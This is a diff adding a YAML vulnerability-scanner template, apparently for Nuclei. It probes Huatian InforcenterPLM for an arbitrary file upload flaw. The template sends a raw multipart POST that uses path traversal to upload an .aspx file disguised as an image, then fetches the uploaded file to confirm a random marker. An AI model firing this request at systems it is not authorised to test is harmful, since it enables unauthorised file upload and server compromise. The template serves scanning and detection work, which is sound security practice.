@@ -1,0 +1,50 @@
+id: huatian-uploadFileHttp-upload
+
+info:
+  name: 华天InforcenterPLM uploadFileHttp 任意文件上传漏洞
+  author: huatian
+  severity: high
+  tags: huatian
+
+http:
+  - raw:
+      - |
+        POST /Base/BaseHandler.ashx?type=uploadFileHttp&uploadPath=../Files/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="s96sd.aspx"
+        Content-Type: image/jpeg
+        
+        {{randstr}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+      - |+
+        GET {{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '\.\.(.*?\.aspx)'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
